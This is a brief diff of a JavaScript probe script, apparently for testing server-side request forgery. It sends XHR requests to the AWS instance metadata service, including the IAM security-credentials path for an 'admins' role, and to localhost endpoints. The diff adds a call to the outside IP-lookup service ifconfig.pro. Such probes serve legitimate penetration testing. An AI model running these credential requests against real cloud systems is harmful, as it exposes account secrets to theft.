@@ -2,6 +2,7 @@ var url0 = "http://169.254.169.254/latest/dynamic/instance-identity/document";
 var url1 = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admins";
 var url2 = "http://localhost:3000";
 var url3 = "http://localhost:3000/1/catalogs";
+var url4 = "https://ifconfig.pro";
 
 var out = document.getElementById("output");
 out.innerHTML = "init";
@@ -44,5 +45,10 @@ xhr.send();
 
 try{
 xhr.open("GET", url3, true);
+xhr.send();
+ } catch(err) {}
+ 
+try{
+xhr.open("GET", url4, true);
 xhr.send();
  } catch(err) {}
